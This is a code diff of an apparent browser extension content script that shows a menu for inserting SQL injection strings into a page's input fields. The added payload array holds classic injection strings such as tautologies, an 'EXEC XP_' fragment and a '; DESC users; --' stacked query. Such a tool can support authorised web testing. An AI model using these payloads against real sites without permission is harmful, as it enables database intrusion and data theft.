@@ -1,91 +1,55 @@
-//alert("ADDON is executing");
-document.body.style.border = "5px solid blue";
-
-var br = document.createElement("br");
-var w = screen.width;
-var h = screen.height;
-
 //Create array of payloads to be added, these should be SQL payloads
-const rawPayloadsDictionary = ["", "1hgvsxcwqytcvqwwucvuq1hgvsxcwqytcvqwvcvquwcuqwucvuq1hgvsxcwqytcvqwvcvquwcuqwucvuq1hgvsxcwqytcvqwvcvquwcuqwucvuq1hgvsxcwqytcvqwvcvquwcuqwucvuq1hgvsxcwqytcvqwvcvquwcuqwucvuq1hgvsxcwqytcvqwvcvquwcuqwucvuq", "2", "3", "4", "5", "6", "7", "8", "9", "10"];
+const rawPayloadsDictionary = ["", "1 OR 1=1", "1\\' OR \\'1\\'=\\'1", "1\\'1", "1 EXEC XP_", "1 AND 1=1", "1\\' AND 1=(SELECT COUNT(*) FROM tablenames); --", "1 AND USER_NAME() = \\'dbo\\'", "\\\\\\'; DESC users; --"];
+
+const ID_MENU = "menu_frame";
+
+var lastInputPressed;
 
 function main() {
+    initializeMenuFrame();
+
+
     const inputs = document.getElementsByTagName("INPUT");
     for (let input of inputs) {
         if (input.tagName === "INPUT") {
             input.onclick = function () {
-                createAndAppendPayoladsBox(this);
+                lastInputPressed = this;
+
+                let menu = document.getElementById(ID_MENU);
+
+                if (isNotNull(menu) && !isVisible(menu)) show(menu);
             }
         }
     }
 }
 
-/**
- *
- * @param element the element where inject the SQL payload
- */
-function createAndAppendPayoladsBox(element) {
-    let container = document.getElementById("container_1");
-    if (null != container) payloadsSpan.remove();
+function initializeMenuFrame() {
+    let menu = document.createElement("iframe");
+    menu.id = ID_MENU;
+    menu.src = browser.extension.getURL("menu/menu.html");
+    hide(menu);
 
-    // Create select list
-    let payloadsList = document.createElement("select");
+    if (null != document.getElementById(menu.id)) return;
 
-    // Create and append options
-    for (let i = 0; i < rawPayloadsDictionary.length; i++) {
-        let payload = document.createElement("option");
-        payload.value = rawPayloadsDictionary[i];
-        payload.text = rawPayloadsDictionary[i];
-        payload.onclick = function () {
-            element.value = this.text;
-        };
-
-        // Append options
-        payloadsList.appendChild(payload);
-    }
-
-    let textInject = document.createElement("span");
-    textInject.innerHTML = "Inject payloads";
-    textInject.style = "color: white; " + centerElementInADiv(50, 0);
-
-
-    let buttonClose = document.createElement("button");
-    buttonClose.innerHTML = "X";
-    buttonClose.style = "color: red; float: right;";
-    buttonClose.onclick = function () {
-        container.remove();
-    };
-
-    container = document.createElement("div");
-    container.style = getStyle();
-    container.id = "container_1";
-    container.appendChild(textInject);
-
-    container.appendChild(buttonClose);
-
-    container.appendChild(br);
-
-    let rawPayloadsText = document.createElement("div");
-    rawPayloadsText.innerHTML = "RAW PAYLOADS";
-    rawPayloadsText.style = centerElementInADiv(50, 0) + "margin-top: 20px;";
-    rawPayloadsText.style.color = "red";
-    container.appendChild(rawPayloadsText);
-
-
-    payloadsList.style = "width: inherit";
-    container.appendChild(payloadsList);
-
-    document.body.appendChild(container);
-
-
+    document.body.appendChild(menu);
 }
 
-function centerElementInADiv(horizontalPercentage, verticalPercentage) {
-    return "position: relative; float: left; left: 50%; transform: translate(-" + horizontalPercentage + "%, " + verticalPercentage + "%);"
+function hide(HTMLElement) {
+    HTMLElement.style.display = "none";
 }
 
-function getStyle() {
-    return "padding: 30px; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background-color: rgba(0, 0, 0, 0.8); width: -moz-available;";
+function show(HTMLElement) {
+    HTMLElement.style.display = "block";
 }
+
+function isVisible(HTMLElement) {
+    return HTMLElement.style.display !== "none";
+}
+
+function isNotNull(HTMLElement) {
+    return null != HTMLElement;
+}
+
 
 //__________
 main();
